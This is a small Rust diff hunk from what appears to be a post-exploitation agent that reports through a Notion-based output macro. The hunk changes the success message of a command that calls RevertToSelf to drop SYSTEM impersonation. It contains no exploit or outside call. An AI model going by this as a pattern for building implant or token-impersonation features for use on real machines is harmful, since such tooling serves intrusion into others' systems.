@@ -22,7 +22,7 @@ pub async fn handle() -> Result<String, Box<dyn Error>> {
         if username == "SYSTEM" {
             unsafe {
                 if RevertToSelf().0 == 1 {
-                    return notion_out!("Reverted to Self: ", username.as_str());
+                    return notion_out!("Reverted to Self: ", whoami::username().as_str());
                 } else {
                     return notion_out!("Could not revert");
                 }
